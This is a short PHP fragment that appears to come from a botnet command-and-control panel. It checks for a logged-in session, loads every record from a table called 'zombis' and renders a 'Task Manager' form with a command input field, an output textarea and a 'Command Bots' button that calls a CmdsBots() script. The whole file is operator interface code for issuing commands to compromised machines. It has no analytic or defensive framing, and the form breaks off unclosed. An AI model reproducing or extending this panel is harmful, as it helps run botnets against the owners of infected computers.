<?php
@session_start(); if ( !isset($_SESSION['login']) ){ header ("Location: ../../");  exit() ; }
require_once('../../includes.php');
	
$Zombis = $DB->Select("SELECT * FROM zombis");



?>
<h2><font face="Tahoma" size="4" color="#666666">Task Manager
</font></h2>
<font face="Tahoma" size="1">
<div id='mgsboxCmds' name='mgsboxCmds' align='center' style="color:#FF0000"></div>
</font>
<form id='frm_findinfo'>
<form method="POST" action="">
<table width='775' border='1' cellpadding='3' style='font-size: 9px; border-collapse: collapse; background-color: #000000;' bordercolor="#666666">
<tr>
	<td align='left' colspan="2"><div>
<p align="center">
<span style="margin-left:0px">
<!--  -->

</span>
<span>
<textarea name="table_cmd" cols="70" rows="8" id="table_cmd" style="border:1px solid #C0C0C0; width: 785; height:185; font-family:Tahoma; color:#666666; font-size:8pt; background-color:#000000" ></textarea></span><span style="margin-left:0px" id="table_cmd" >

</span>
</div></td>
</tr>



<tr>
	<td align='left' width="641">





<input type="text" name="ComandosCmds" id="ComandosCmds" size="127" style="font-family: Tahoma; font-size: 8pt; color: #666666; border: 1px solid #C0C0C0; background-color: #000000"></td>
	<td align='left' width="119">





<input type='button' value='Command Bots'  onclick='CmdsBots();' style="font-family: Tahoma; font-size: 8pt; border: 1px solid #666666; ; color:#666666; background-color:#000000"></td>
</tr>





